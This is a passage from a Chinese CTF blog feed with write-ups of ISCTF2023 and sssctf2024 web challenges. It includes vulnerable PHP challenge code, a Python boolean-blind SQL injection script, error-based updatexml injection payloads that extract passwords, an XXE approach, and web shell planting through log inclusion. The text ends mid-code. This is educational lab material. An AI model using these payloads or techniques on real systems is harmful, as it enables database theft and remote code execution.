class="string">&quot;奇技淫巧？大胆！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/fl|ag|\.|x/i&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;大胆！！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这题是个纸老虎，\并没有过滤，可以照常读取文件</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516155647197.png" class="" title="image-20240516155647197"><h2 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a>1z_Ssql</h2><p>过滤了=，+，sleep，union，where</p><p>order by测出来有三个字段（不过似乎没啥用？）</p><p>不过看过滤情况只能是布尔盲注</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240516160339164.png" class="" title="image-20240516160339164"><p>测试<code>admin&#39; and if(length(database())&gt;1,1,0);#</code>后发现有hint相关回显（虽然那hint没什么用就是了），是布尔盲注无疑了</p><p>（原题中好像是有附件的，但是这上面没有，只能看wp复现了：得到表名users和列名username，password</p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20511/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(40):</span></span><br><span class="line"><span class="comment">#   payload = f&#x27;admin\&#x27; and if(length(database())&gt;&#123;i&#125;,1,0);#&#x27;</span></span><br><span class="line">  <span class="comment"># data = &#123;</span></span><br><span class="line">  <span class="comment">#   &#x27;username&#x27;: payload,</span></span><br><span class="line">  <span class="comment">#   &#x27;password&#x27;: 1234,</span></span><br><span class="line">  <span class="comment">#   &#x27;submit&#x27;: 1</span></span><br><span class="line">  <span class="comment"># &#125;</span></span><br><span class="line"><span class="comment">#   print(payload)</span></span><br><span class="line"><span class="comment">#   req = requests.post(url=url,data=data)</span></span><br><span class="line"><span class="comment">#   for j in range </span></span><br><span class="line"><span class="comment">#   if &#x27;hint&#x27; in req.text:</span></span><br><span class="line"><span class="comment">#     continue</span></span><br><span class="line"><span class="comment">#   else:</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"><span class="comment">#     break # length = 6</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">  left = <span class="number">32</span></span><br><span class="line">  right = <span class="number">127</span></span><br><span class="line">  mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> left &lt; right:</span><br><span class="line">    <span class="comment"># payload = f&#x27;admin\&#x27; and if((ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,0)#&#x27; # bthcls</span></span><br><span class="line">    <span class="comment"># payload = f&#x27;admin\&#x27; and if((ascii(substr((select group_concat(username) from bthcls.users),&#123;i&#125;,1))&gt;&#123;mid&#125;),1,0)#&#x27; # admin</span></span><br><span class="line">    payload = <span class="string">f&#x27;admin\&#x27; and if((ascii(substr((select group_concat(password) from bthcls.users),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),1,0)#&#x27;</span> <span class="comment"># we1come7o1sctf</span></span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span>: <span class="number">1234</span>,</span><br><span class="line">      <span class="string">&#x27;submit&#x27;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;hint&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">      left = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      right = mid</span><br><span class="line">    mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">  result += <span class="built_in">chr</span>(mid)</span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>:::info no-icon</p><p>后面看wp才发现有信息泄露：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;here_is_a_sercet.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="string">&quot;762V08zk+xrmKxIFrdJIJj6ULvI8Lc0pX39LjDyIUb0eAGkZe4KQa87TJXuqnFw0u/669wWRsqYFya812FtULw9+tpiGlaH2gleDfDKzr+g=&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$black_list</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;h4&gt;illegal words!&lt;/h4&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>base64不能直接解密，可以在主页看看用的是什么方式加密</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517114714742.png" class="" title="image-20240517114714742"><p>是一个SM4加密</p><p>直接找工具解密即可，waf是<code>/union|=|+|sleep|benchmark|for|where|sys|innodb|is|null|like|/*|*//i</code></p><p>:::</p><h2 id="Where-is-the-flag"><a href="#Where-is-the-flag" class="headerlink" title="Where is the flag"></a>Where is the flag</h2><p>标准的一句话木马，实际上想考察的是linux的一些命令</p><p>第一个flag：当前目录下的flag.php ISCTF{Y0u_6u</p><p>第二个flag：根目录下一个flag cceeded_in_f</p><p>第三个flag：flag.sh里面 ind1n9_f1ag}</p><p>这个不知道对不对，当时在做的时候第二个找都找不到，flag1还是在<code>/flag</code>里面的</p><p>后面根据提示，在xxx中，猜想环境变量中应该是有的，毕竟web动态题生成flag还是很依赖环境变量来随机生成的</p><p>直接<code>system(&#39;env&#39;);</code>,发现还真有</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517120355386.png" class="" title="image-20240517120355386"><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p>这题看着没太大突破扣，那就找一下附件里面有没有什么可以利用的吧</p><p>注意到register.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;utils/function.php&quot;</span>;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">include</span> <span class="string">&quot;utils/config.php&quot;</span>;</span><br><span class="line">    <span class="variable">$user_xml_format</span> = <span class="string">&quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="string">                        &lt;userinfo&gt;</span></span><br><span class="line"><span class="string">                            &lt;user&gt;</span></span><br><span class="line"><span class="string">                                &lt;username&gt;%s&lt;/username&gt;</span></span><br><span class="line"><span class="string">                                &lt;password&gt;%s&lt;/password&gt;</span></span><br><span class="line"><span class="string">                            &lt;/user&gt;</span></span><br><span class="line"><span class="string">                        &lt;/userinfo&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>)) <span class="keyword">die</span>(<span class="string">&quot;Username or password cannot be empty XD&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$username</span>)) <span class="keyword">die</span>(<span class="string">&quot;Invalid username. :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_user_exists</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&quot;user_info_dir&quot;</span>])) <span class="keyword">die</span>(<span class="string">&quot;User already exists XD&quot;</span>);</span><br><span class="line">    <span class="variable">$user_xml</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$user_xml_format</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">register_user</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&#x27;user_info_dir&#x27;</span>], <span class="variable">$user_xml</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在变量覆盖函数，可以试着往这个点打</p><p>同时发现，用户名和密码是以xml形式来存储的，根据这个可以试着用xxe打</p><p>由于function.php中存在这样一个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_record</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$user_info_dir</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user_info_xml</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$user_info_dir</span>.<span class="variable">$username</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;.xml&#x27;</span>);</span><br><span class="line">        <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$user_info_xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样可以利用<code>file://</code>协议去读取flag</p><p>login.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;utils/function.php&quot;</span>;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">include</span>  <span class="string">&quot;utils/config.php&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>)) <span class="keyword">die</span>(<span class="string">&quot;Username or password cannot be empty XD&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_user_exists</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&quot;user_info_dir&quot;</span>])) <span class="keyword">die</span>(<span class="string">&quot;Username error&quot;</span>);</span><br><span class="line">    <span class="variable">$user_record</span> = <span class="title function_ invoke__">get_user_record</span>(<span class="variable">$username</span>, <span class="variable">$config</span>[<span class="string">&#x27;user_info_dir&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user_record</span>-&gt;user-&gt;password != <span class="variable">$password</span>) <span class="keyword">die</span>(<span class="string">&quot;Password error for User:&quot;</span>.<span class="variable">$user_record</span>-&gt;user-&gt;username);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:main.html&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们可以通过输入错误的密码来让我们的注入得到回显</p><p>先抓个包，注册一个账号</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517123406335.png" class="" title="image-20240517123406335"><p>然后故意输错密码：</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517123434562.png" class="" title="image-20240517123434562"><p>成功回显，可以直接拿flag了</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517123536365.png" class="" title="image-20240517123536365"><h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p>根据题目可以用<code>.user.ini</code>进行文件包含，由于在之前的测试中测出许多关键符号被过滤，所以只能放弃上传:horse:，转而用文件包含漏洞</p><p>这里我们可以包含日志文件，利用UA传:horse:</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517164734836.png" class="" title="image-20240517164734836"><p>然后访问upload.php</p><img src="/2024/05/16/competition/Others/ISCTF2023/image-20240517164638726.png" class="" title="image-20240517164638726">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;绕进你心里&quot;&gt;&lt;a href=&quot;#绕进你心里&quot; class=&quot;headerlink&quot; title=&quot;绕进你心里&quot;&gt;&lt;/a&gt;绕进你心里&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;highlight_file&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title function_ invoke__&quot;&gt;error_reporting&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt; = (String)&lt;span class=&quot;variable&quot;&gt;$_POST&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;pan_gu&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$num&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;zhurong&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$lida1&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;hongmeng&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$lida2&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&amp;#x27;shennong&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$lida1&lt;/span&gt; !== &lt;span class=&quot;variable&quot;&gt;$lida2&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&quot;title function_ invoke__&quot;&gt;md5&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$lida1&lt;/span&gt;) === &lt;span class=&quot;title function_ invoke__&quot;&gt;md5&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$lida2&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;md5绕过了!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;title function_ invoke__&quot;&gt;preg_match&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;/[0-9]/&amp;quot;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$num&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;你干嘛?哎哟!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;elseif&lt;/span&gt;(&lt;span class=&quot;title function_ invoke__&quot;&gt;intval&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$num&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;title function_ invoke__&quot;&gt;preg_match&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;#x27;/.+?ISCTF/is&amp;#x27;&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;再想想!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;title function_ invoke__&quot;&gt;stripos&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$str&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;2023ISCTF&amp;#x27;&lt;/span&gt;) === &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;就差一点点啦!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sssctf2024-复现</title>
    <link href="http://luffys93.github.io/2024/05/07/competition/202404/sssctf2024/"/>
    <id>http://luffys93.github.io/2024/05/07/competition/202404/sssctf2024/</id>
    <published>2024-05-07T03:27:59.000Z</published>
    <updated>2024-07-31T08:37:32.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计费系统"><a href="#计费系统" class="headerlink" title="计费系统"></a>计费系统</h1><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507113355447.png" class="" title="image-20240507113355447"><p>这一页是没有注入的，只能sso登录</p><span id="more"></span><p>登陆之后直接进入<code>/Self/service/myMac</code>路由下寻找信息（前面的信息寻找过程略），发现存在隐写字符</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507113825768.png" class="" title="image-20240507113825768"><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507113835015.png" class="" title="image-20240507113835015"><p>这里要注意一下，零宽隐写字符的加密解密需要在同一个网页进行，说白了，用啥工具加密就用啥工具解密，当时做的时候忙着找各种网站尝试解密了，后面才试出来（所以下面的第一个工具会解出来乱码）</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507114310864.png" class="" title="image-20240507114310864"><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507114415958.png" class="" title="image-20240507114415958"><p>去到<code>/Administrator/Login</code>中查看信息</p><p>这里可能存在sql注入，可以尝试闭合</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507114627853.png" class="" title="image-20240507114627853"><p>这里试出来是<code>&quot;</code>闭合，根据返回的信息推测是布尔盲注</p><p>直接上payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);#  # ChallengeDatabase</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;ChallengeDatabase&#x27; limit 0,1),0x7e),1);# # users</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),0x7e),1);# # id,loginip,name,password,sso</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),0,40),0x7e),1);# 这里由于最大长度的限制，所以用到了substring来截取密码，把起始点和截取长度改一下就行 得到05d1b851-ef06-4460-9c30-4249086631d3</span><br></pre></td></tr></table></figure><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507120047258.png" class="" title="image-20240507120047258"><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507120400327.png" class="" title="image-20240507120400327"><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507120450857.png" class="" title="image-20240507120450857"><p>得到账户名和密码后发现以下界面</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507121550360.png" class="" title="image-20240507121550360"><p>抓个包看看</p><p>注意到一个dashboard跳转，发现一个之前界面中没有的aes.js</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507121754961.png" class="" title="image-20240507121754961"><p>查看发现有以下脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// const aes256cbcDecrypt = (encryptedData, key, iv) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//     const decipher = crypto.createDecipheriv(&#x27;aes-256-cbc&#x27;, key, iv);</span></span><br><span class="line"><span class="comment">//     return decryptedData;</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"><span class="comment">// const key = &quot;a1e7091c4f39e1571f5d4eaf08c7b28c&quot;;</span></span><br><span class="line"><span class="comment">// const iv = &quot;e8d4f92b75f64e7c&quot;;</span></span><br><span class="line"><span class="comment">// function readtokens(token) &#123;</span></span><br><span class="line"><span class="comment">//     return aes256cbcDecrypt(token, key, iv);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><p>这里用到了aes256cbc方式加密，可能在之前的界面中有输出，回去看一下</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507122039872.png" class="" title="image-20240507122039872"><p>发现一串可疑字符串，猜测就是该加密方式下的密文，拿去解密一下</p><img src="/2024/05/07/competition/202404/sssctf2024/image-20240507122803080.png" class="" title="image-20240507122803080"><p>根据题目描述，所有账户的密码相同，flag为flag账户的密码，因此我们的账户密码也是flag，上面一串字符串就是</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decipher_sssctf</span>(<span 